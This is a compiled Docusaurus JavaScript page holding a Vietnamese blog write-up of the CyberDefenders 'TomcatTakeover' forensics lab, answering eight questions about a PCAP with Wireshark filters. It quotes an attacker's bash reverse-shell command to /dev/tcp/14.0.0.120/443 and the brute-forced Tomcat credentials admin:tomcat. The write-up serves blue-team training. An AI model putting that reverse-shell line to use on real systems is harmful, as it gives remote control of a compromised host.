"use strict";(self.webpackChunklittle_docusaur=self.webpackChunklittle_docusaur||[]).push([[1044],{3379:(n,h,c)=>{c.r(h),c.d(h,{assets:()=>s,contentTitle:()=>l,default:()=>o,frontMatter:()=>r,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"cyberdefenders-training/TomcatTakeover-lab","title":"TomcatTakeover Lab","description":"Ehe, nay t\xf4i v\xe0 c\u1eadu \u1ea5y l\xe0m b\xe0i lab nh\u1ecf \u0111\u1ec3 kh\xf4ng b\u1ecb nh\u1ed3i l\xfd thuy\u1ebft qu\xe1 nh\xecuv. C\u1ee7a t\xf4i v\xe0 c\u1eadu \u1ea5y c\u0169ng ch\u1ec9 l\xe0 ghi l\u1ea1i qu\xe1 tr\xecnh l\xe0m th\xf4i \xe0...","source":"@site/docs/cyberdefenders-training/TomcatTakeover-lab.md","sourceDirName":"cyberdefenders-training","slug":"/cyberdefenders-training/TomcatTakeover-lab","permalink":"/docs/cyberdefenders-training/TomcatTakeover-lab","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/cyberdefenders-training/TomcatTakeover-lab.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"title":"TomcatTakeover Lab","sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"IcedID Lab","permalink":"/docs/cyberdefenders-training/IcedID-lab"},"next":{"title":"Wireshark Cheatsheet","permalink":"/docs/cyberdefenders-training/wireshark-cheatsheet"}}');var e=c(4848),i=c(8453);const r={title:"TomcatTakeover Lab",sidebar_position:4},l=void 0,s={},d=[{value:"Ng\u1eef c\u1ea3nh",id:"ng\u1eef-c\u1ea3nh",level:2},{value:"C\xf4ng c\u1ee5 s\u1eed d\u1ee5ng",id:"c\xf4ng-c\u1ee5-s\u1eed-d\u1ee5ng",level:2},{value:"C\xe2u h\u1ecfi",id:"c\xe2u-h\u1ecfi",level:2},{value:"Q1: H\xe3y x\xe1c \u0111\u1ecbnh \u0111\u1ecba ch\u1ec9 IP ngu\u1ed3n \u0111\xe3 kh\u1edfi t\u1ea1o c\xe1c y\xeau c\u1ea7u n\xe0y tr\xean m\xe1y ch\u1ee7 c\u1ee7a ch\xfang ta?",id:"q1-h\xe3y-x\xe1c-\u0111\u1ecbnh-\u0111\u1ecba-ch\u1ec9-ip-ngu\u1ed3n-\u0111\xe3-kh\u1edfi-t\u1ea1o-c\xe1c-y\xeau-c\u1ea7u-n\xe0y-tr\xean-m\xe1y-ch\u1ee7-c\u1ee7a-ch\xfang-ta",level:3},{value:"Q2: B\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh th\xe0nh ph\u1ed1 n\u01a1i ho\u1ea1t \u0111\u1ed9ng c\u1ee7a attacker b\u1eaft ngu\u1ed3n kh\xf4ng?",id:"q2-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-th\xe0nh-ph\u1ed1-n\u01a1i-ho\u1ea1t-\u0111\u1ed9ng-c\u1ee7a-attacker-b\u1eaft-ngu\u1ed3n-kh\xf4ng",level:3},{value:"Q3: C\u1ed5ng n\xe0o trong s\u1ed1 n\xe0y cung c\u1ea5p quy\u1ec1n truy c\u1eadp v\xe0o giao di\u1ec7n qu\u1ea3n tr\u1ecb web server?",id:"q3-c\u1ed5ng-n\xe0o-trong-s\u1ed1-n\xe0y-cung-c\u1ea5p-quy\u1ec1n-truy-c\u1eadp-v\xe0o-giao-di\u1ec7n-qu\u1ea3n-tr\u1ecb-web-server",level:3},{value:"Q4: C\xe1c c\xf4ng c\u1ee5 n\xe0o b\u1ea1n x\xe1c \u0111\u1ecbnh \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3 attacker trong qu\xe1 tr\xecnh li\u1ec7t k\xea n\xe0y?",id:"q4-c\xe1c-c\xf4ng-c\u1ee5-n\xe0o-b\u1ea1n-x\xe1c-\u0111\u1ecbnh-\u0111\u01b0\u1ee3c-h\u1ed7-tr\u1ee3-attacker-trong-qu\xe1-tr\xecnh-li\u1ec7t-k\xea-n\xe0y",level:3},{value:"Q5: Th\u01b0 m\u1ee5c c\u1ee5 th\u1ec3 n\xe0o li\xean quan \u0111\u1ebfn admin panel m\xe0 attacker ph\xe1t hi\u1ec7n \u0111\u01b0\u1ee3c?",id:"q5-th\u01b0-m\u1ee5c-c\u1ee5-th\u1ec3-n\xe0o-li\xean-quan-\u0111\u1ebfn-admin-panel-m\xe0-attacker-ph\xe1t-hi\u1ec7n-\u0111\u01b0\u1ee3c",level:3},{value:"Q6: T\u1eeb d\u1eef li\u1ec7u, b\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh c\u1eb7p username ch\xednh x\xe1c m\xe0 attacker \u0111\xe3 d\xf9ng th\xe0nh c\xf4ng kh\xf4ng?",id:"q6-t\u1eeb-d\u1eef-li\u1ec7u-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-c\u1eb7p-username-ch\xednh-x\xe1c-m\xe0-attacker-\u0111\xe3-d\xf9ng-th\xe0nh-c\xf4ng-kh\xf4ng",level:3},{value:"Q7: B\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh t\xean t\u1ec7p \u0111\u1ed9c h\u1ea1i n\xe0y t\u1eeb d\u1eef li\u1ec7u capture kh\xf4ng?",id:"q7-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-t\xean-t\u1ec7p-\u0111\u1ed9c-h\u1ea1i-n\xe0y-t\u1eeb-d\u1eef-li\u1ec7u-capture-kh\xf4ng",level:3},{value:"Q8: T\u1eeb ph\xe2n t\xedch, b\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh l\u1ec7nh c\u1ee5 th\u1ec3 m\xe0 h\u1ecd l\xean l\u1ecbch ch\u1ea1y \u0111\u1ec3 duy tr\xec s\u1ef1 hi\u1ec7n di\u1ec7n kh\xf4ng?",id:"q8-t\u1eeb-ph\xe2n-t\xedch-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-l\u1ec7nh-c\u1ee5-th\u1ec3-m\xe0-h\u1ecd-l\xean-l\u1ecbch-ch\u1ea1y-\u0111\u1ec3-duy-tr\xec-s\u1ef1-hi\u1ec7n-di\u1ec7n-kh\xf4ng",level:3}];function a(n){const h={a:"a",code:"code",h2:"h2",h3:"h3",li:"li",p:"p",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...n.components};return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(h.p,{children:["Ehe, nay t\xf4i v\xe0 c\u1eadu \u1ea5y l\xe0m b\xe0i lab nh\u1ecf \u0111\u1ec3 kh\xf4ng b\u1ecb nh\u1ed3i l\xfd thuy\u1ebft qu\xe1 nh\xecu :3 s\u1eb5n ti\u1ec7n \xf4n l\u1ea1i Threat Intel skill lun nha. B\xe0i ",(0,e.jsx)(h.a,{href:"https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/",children:"Tomcat Takeover"})," n\xe0y \u1edf m\u1ee9c d\u1ec5 v\xe0 c\u0169ng c\xf3 h\u01b0\u1edbng d\u1eabn r\u1ed3i nha, m\u1ecdi ng\u01b0\u1eddi n\xean xem qua h\u01b0\u1edbng d\u1eabn \u0111\u1ec3 c\xf3 nhi\u1ec1u th\xf4ng tin v\xe0 ch\xednh x\xe1c h\u01a1n ",":v",". C\u1ee7a t\xf4i v\xe0 c\u1eadu \u1ea5y c\u0169ng ch\u1ec9 l\xe0 ghi l\u1ea1i qu\xe1 tr\xecnh l\xe0m th\xf4i \xe0..."]}),"\n",(0,e.jsx)(h.h2,{id:"ng\u1eef-c\u1ea3nh",children:"Ng\u1eef c\u1ea3nh"}),"\n",(0,e.jsx)(h.p,{children:"Nh\xf3m SOC \u0111\xe3 x\xe1c \u0111\u1ecbnh ho\u1ea1t \u0111\u1ed9ng \u0111\xe1ng ng\u1edd tr\xean m\xe1y ch\u1ee7 web trong m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a c\xf4ng ty. \u0110\u1ec3 hi\u1ec3u r\xf5 h\u01a1n v\u1ec1 khai th\xe1c, h\u1ecd \u0111\xe3 n\u1eafm b\u1eaft l\u01b0u l\u01b0\u1ee3ng m\u1ea1ng \u0111\u1ec3 ph\xe2n t\xedch. T\u1ec7p PCAP c\xf3 th\u1ec3 ch\u1ee9a b\u1eb1ng ch\u1ee9ng v\u1ec1 c\xe1c ho\u1ea1t \u0111\u1ed9ng \u0111\u1ed9c h\u1ea1i d\u1eabn \u0111\u1ebfn s\u1ef1 th\u1ecfa hi\u1ec7p c\u1ee7a m\xe1y ch\u1ee7 web Apache Tomcat. Nhi\u1ec7m v\u1ee5 c\u1ee7a b\u1ea1n l\xe0 ph\xe2n t\xedch t\u1ec7p PCAP \u0111\u1ec3 hi\u1ec3u ph\u1ea1m vi c\u1ee7a cu\u1ed9c t\u1ea5n c\xf4ng."}),"\n",(0,e.jsx)(h.h2,{id:"c\xf4ng-c\u1ee5-s\u1eed-d\u1ee5ng",children:"C\xf4ng c\u1ee5 s\u1eed d\u1ee5ng"}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.a,{href:"https://www.wireshark.org/download.html",children:"Wireshark"}),": \u0110\xe2y l\xe0 c\xf4ng c\u1ee5 ph\xe2n t\xedch g\xf3i tin m\u1ea1ng mi\u1ec5n ph\xed v\xe0 m\u1ea1nh m\u1ebd nh\u1ea5t hi\u1ec7n nay. Wireshark cho ph\xe9p theo d\xf5i l\u01b0u l\u01b0\u1ee3ng m\u1ea1ng, tr\xedch xu\u1ea5t d\u1eef li\u1ec7u t\u1eeb file .pcap, l\u1ecdc, t\xecm ki\u1ebfm v\xe0 ph\xe2n t\xedch c\xe1c k\u1ebft n\u1ed1i, y\xeau c\u1ea7u HTTP, th\xf4ng tin \u0111\u0103ng nh\u1eadp, t\u1ea3i l\xean t\u1ec7p \u0111\u1ed9c h\u1ea1i, v\xe0 nhi\u1ec1u ho\u1ea1t \u0111\u1ed9ng kh\u1ea3 nghi kh\xe1c. Trong b\xe0i n\xe0y, Wireshark \u0111\u01b0\u1ee3c d\xf9ng \u0111\u1ec3 l\u1ea7n theo d\u1ea5u v\u1ebft attacker t\u1eeb l\xfac qu\xe9t c\u1ed5ng cho \u0111\u1ebfn khi thi\u1ebft l\u1eadp k\u1ebft n\u1ed1i reverse shell th\xe0nh c\xf4ng."]}),"\n"]}),"\n",(0,e.jsx)(h.h2,{id:"c\xe2u-h\u1ecfi",children:"C\xe2u h\u1ecfi"}),"\n",(0,e.jsx)(h.h3,{id:"q1-h\xe3y-x\xe1c-\u0111\u1ecbnh-\u0111\u1ecba-ch\u1ec9-ip-ngu\u1ed3n-\u0111\xe3-kh\u1edfi-t\u1ea1o-c\xe1c-y\xeau-c\u1ea7u-n\xe0y-tr\xean-m\xe1y-ch\u1ee7-c\u1ee7a-ch\xfang-ta",children:"Q1: H\xe3y x\xe1c \u0111\u1ecbnh \u0111\u1ecba ch\u1ec9 IP ngu\u1ed3n \u0111\xe3 kh\u1edfi t\u1ea1o c\xe1c y\xeau c\u1ea7u n\xe0y tr\xean m\xe1y ch\u1ee7 c\u1ee7a ch\xfang ta?"}),"\n",(0,e.jsx)(h.p,{children:"T\u1eeb ph\xe2n t\xedch pcap, ho\u1ea1t \u0111\u1ed9ng \u0111\xe1ng ng\u1edd cho th\u1ea5y m\u1ed9t lo\u1ea1t y\xeau c\u1ea7u qua nhi\u1ec1u c\u1ed5ng, g\u1ee3i \xfd h\xe0nh vi qu\xe9t."}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"14.0.0.120"})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," \u0110\u1ecba ch\u1ec9 IP ngu\u1ed3n ph\xe1t t\xe1n g\xf3i qu\xe9t."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong file pcap, s\u1eed d\u1ee5ng Wireshark."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," L\u1ecdc theo \u0111\u1ecba ch\u1ec9 IP (v\xed d\u1ee5 ",(0,e.jsx)(h.code,{children:"ip.src == x.x.x.x"}),"), ho\u1eb7c d\xf9ng Statistics \u2192 Endpoints/Conversations \u0111\u1ec3 xem host g\u1eedi nhi\u1ec1u g\xf3i nh\u1ea5t."]}),"\n"]}),"\n",(0,e.jsx)(h.h3,{id:"q2-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-th\xe0nh-ph\u1ed1-n\u01a1i-ho\u1ea1t-\u0111\u1ed9ng-c\u1ee7a-attacker-b\u1eaft-ngu\u1ed3n-kh\xf4ng",children:"Q2: B\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh th\xe0nh ph\u1ed1 n\u01a1i ho\u1ea1t \u0111\u1ed9ng c\u1ee7a attacker b\u1eaft ngu\u1ed3n kh\xf4ng?"}),"\n",(0,e.jsx)(h.p,{children:"D\u1ef1a tr\xean \u0111\u1ecba ch\u1ec9 IP attacker \u0111\xe3 x\xe1c \u0111\u1ecbnh,"}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"China"})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," Th\xe0nh ph\u1ed1 (city) trong th\xf4ng tin WHOIS."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," C\xf4ng c\u1ee5 tra c\u1ee9u WHOIS (whois.com, whois CLI\u2026)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," Sao ch\xe9p IP v\xe0o d\u1ecbch v\u1ee5 WHOIS, t\xecm tr\u01b0\u1eddng \u201cCity\u201d."]}),"\n"]}),"\n",(0,e.jsx)(h.h3,{id:"q3-c\u1ed5ng-n\xe0o-trong-s\u1ed1-n\xe0y-cung-c\u1ea5p-quy\u1ec1n-truy-c\u1eadp-v\xe0o-giao-di\u1ec7n-qu\u1ea3n-tr\u1ecb-web-server",children:"Q3: C\u1ed5ng n\xe0o trong s\u1ed1 n\xe0y cung c\u1ea5p quy\u1ec1n truy c\u1eadp v\xe0o giao di\u1ec7n qu\u1ea3n tr\u1ecb web server?"}),"\n",(0,e.jsx)(h.p,{children:"T\u1eeb ph\xe2n t\xedch pcap, nhi\u1ec1u c\u1ed5ng m\u1edf \u0111\xe3 \u0111\u01b0\u1ee3c ph\xe1t hi\u1ec7n do qu\xe1 tr\xecnh qu\xe9t."}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"8080"})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," S\u1ed1 c\u1ed5ng HTTP Admin (th\u01b0\u1eddng l\xe0 8080 tr\xean Tomcat)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong lu\u1ed3ng pcap gi\u1eefa attacker v\xe0 server."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," L\u1ecdc theo IP attacker v\xe0 IP server r\u1ed3i xem port \u0111\xedch ph\u1ed5 bi\u1ebfn nh\u1ea5t, ho\u1eb7c filter ",(0,e.jsx)(h.code,{children:"tcp.port == 8080"}),"."]}),"\n"]}),"\n",(0,e.jsx)(h.h3,{id:"q4-c\xe1c-c\xf4ng-c\u1ee5-n\xe0o-b\u1ea1n-x\xe1c-\u0111\u1ecbnh-\u0111\u01b0\u1ee3c-h\u1ed7-tr\u1ee3-attacker-trong-qu\xe1-tr\xecnh-li\u1ec7t-k\xea-n\xe0y",children:"Q4: C\xe1c c\xf4ng c\u1ee5 n\xe0o b\u1ea1n x\xe1c \u0111\u1ecbnh \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3 attacker trong qu\xe1 tr\xecnh li\u1ec7t k\xea n\xe0y?"}),"\n",(0,e.jsx)(h.p,{children:"Sau khi ph\xe1t hi\u1ec7n c\xe1c c\u1ed5ng m\u1edf, attacker \u0111\xe3 c\u1ed1 g\u1eafng li\u1ec7t k\xea v\xe0 kh\xe1m ph\xe1 th\u01b0 m\u1ee5c tr\xean web server."}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"gobuster"})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," T\xean c\xf4ng c\u1ee5 li\u1ec7t k\xea th\u01b0 m\u1ee5c (User\u2011Agent)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong ti\xeau \u0111\u1ec1 HTTP request (User\u2011Agent)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," L\u1ecdc HTTP GET requests, xem tr\u01b0\u1eddng User\u2011Agent."]}),"\n"]}),"\n",(0,e.jsx)(h.h3,{id:"q5-th\u01b0-m\u1ee5c-c\u1ee5-th\u1ec3-n\xe0o-li\xean-quan-\u0111\u1ebfn-admin-panel-m\xe0-attacker-ph\xe1t-hi\u1ec7n-\u0111\u01b0\u1ee3c",children:"Q5: Th\u01b0 m\u1ee5c c\u1ee5 th\u1ec3 n\xe0o li\xean quan \u0111\u1ebfn admin panel m\xe0 attacker ph\xe1t hi\u1ec7n \u0111\u01b0\u1ee3c?"}),"\n",(0,e.jsx)(h.p,{children:"Ti\u1ebfp theo n\u1ed7 l\u1ef1c li\u1ec7t k\xea, attacker g\u1eedi nhi\u1ec1u y\xeau c\u1ea7u \u0111\u1ec3 t\xecm giao di\u1ec7n qu\u1ea3n tr\u1ecb."}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"/manager"})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," \u0110\u01b0\u1eddng d\u1eabn (path) d\u1eabn t\u1edbi admin panel (",(0,e.jsx)(h.code,{children:"/manager"}),", ",(0,e.jsx)(h.code,{children:"/admin"}),"\u2026)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong HTTP GET responses."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," Filter ",(0,e.jsx)(h.code,{children:'http.request.uri contains "admin"'})," r\u1ed3i xem m\xe3 HTTP 401/200."]}),"\n"]}),"\n",(0,e.jsxs)(h.h3,{id:"q6-t\u1eeb-d\u1eef-li\u1ec7u-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-c\u1eb7p-username-ch\xednh-x\xe1c-m\xe0-attacker-\u0111\xe3-d\xf9ng-th\xe0nh-c\xf4ng-kh\xf4ng",children:["Q6: T\u1eeb d\u1eef li\u1ec7u, b\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh c\u1eb7p username",":password"," ch\xednh x\xe1c m\xe0 attacker \u0111\xe3 d\xf9ng th\xe0nh c\xf4ng kh\xf4ng?"]}),"\n",(0,e.jsx)(h.p,{children:"Khi truy c\u1eadp v\xe0o admin panel, attacker th\u1eed brute-force \u0111\u0103ng nh\u1eadp."}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsxs)(h.th,{children:["admin",":tomcat"]})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," Basic Auth credentials (Base64)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong HTTP POST ho\u1eb7c header Authorization."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," Filter ",(0,e.jsx)(h.code,{children:'http.request.method == "POST"'})," ho\u1eb7c ",(0,e.jsx)(h.code,{children:"http.authbasic"})," \u2192 gi\u1ea3i m\xe3 Base64."]}),"\n"]}),"\n",(0,e.jsx)(h.h3,{id:"q7-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-t\xean-t\u1ec7p-\u0111\u1ed9c-h\u1ea1i-n\xe0y-t\u1eeb-d\u1eef-li\u1ec7u-capture-kh\xf4ng",children:"Q7: B\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh t\xean t\u1ec7p \u0111\u1ed9c h\u1ea1i n\xe0y t\u1eeb d\u1eef li\u1ec7u capture kh\xf4ng?"}),"\n",(0,e.jsx)(h.p,{children:"Sau khi \u0111\u0103ng nh\u1eadp, attacker \u0111\xe3 t\u1ea3i l\xean m\u1ed9t t\u1ec7p \u0111\u1ec3 thi\u1ebft l\u1eadp reverse shell."}),"\n",(0,e.jsx)(h.table,{children:(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"JXQOZY.war"})]})})}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," T\xean file \u0111\u01b0\u1ee3c upload (v\xed d\u1ee5 ",(0,e.jsx)(h.code,{children:"*.war"}),")."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong HTTP POST t\u1edbi ",(0,e.jsx)(h.code,{children:"/manager/html/upload"}),"."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," Filter ",(0,e.jsx)(h.code,{children:'http.request.uri contains "/upload"'})," v\xe0 xem ph\u1ea7n payload ch\u1ee9a t\xean file."]}),"\n"]}),"\n",(0,e.jsx)(h.h3,{id:"q8-t\u1eeb-ph\xe2n-t\xedch-b\u1ea1n-c\xf3-th\u1ec3-x\xe1c-\u0111\u1ecbnh-l\u1ec7nh-c\u1ee5-th\u1ec3-m\xe0-h\u1ecd-l\xean-l\u1ecbch-ch\u1ea1y-\u0111\u1ec3-duy-tr\xec-s\u1ef1-hi\u1ec7n-di\u1ec7n-kh\xf4ng",children:"Q8: T\u1eeb ph\xe2n t\xedch, b\u1ea1n c\xf3 th\u1ec3 x\xe1c \u0111\u1ecbnh l\u1ec7nh c\u1ee5 th\u1ec3 m\xe0 h\u1ecd l\xean l\u1ecbch ch\u1ea1y \u0111\u1ec3 duy tr\xec s\u1ef1 hi\u1ec7n di\u1ec7n kh\xf4ng?"}),"\n",(0,e.jsx)(h.p,{children:"Sau khi thi\u1ebft l\u1eadp reverse shell th\xe0nh c\xf4ng, attacker mu\u1ed1n duy tr\xec truy c\u1eadp."}),"\n",(0,e.jsxs)(h.table,{children:[(0,e.jsx)(h.thead,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,e.jsx)(h.th,{children:"/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'"})]})}),(0,e.jsx)(h.tbody,{children:(0,e.jsxs)(h.tr,{children:[(0,e.jsx)(h.td,{}),(0,e.jsx)(h.td,{})]})})]}),"\n",(0,e.jsxs)(h.ul,{children:["\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm c\xe1i g\xec:"})," L\u1ec7nh persistence (cronjob, systemd unit\u2026)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," Trong n\u1ed9i dung reverse shell (Follow TCP Stream)."]}),"\n",(0,e.jsxs)(h.li,{children:[(0,e.jsx)(h.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," S\u1eed d\u1ee5ng Follow TCP Stream tr\xean phi\xean shell, t\xecm l\u1ec7nh ",(0,e.jsx)(h.code,{children:"crontab"}),", ",(0,e.jsx)(h.code,{children:'echo "* * * * * ..."'})," ho\u1eb7c t\u01b0\u01a1ng t\u1ef1."]}),"\n"]})]})}function o(n={}){const{wrapper:h}={...(0,i.R)(),...n.components};return h?(0,e.jsx)(h,{...n,children:(0,e.jsx)(a,{...n})}):a(n)}},8453:(n,h,c)=>{c.d(h,{R:()=>r,x:()=>l});var t=c(6540);const e={},i=t.createContext(e);function r(n){const h=t.useContext(i);return t.useMemo((function(){return"function"==typeof n?n(h):{...h,...n}}),[h,n])}function l(n){let h;return h=n.disableParentContext?"function"==typeof n.components?n.components(e):n.components||e:r(n.components),t.createElement(i.Provider,{value:h},n.children)}}}]);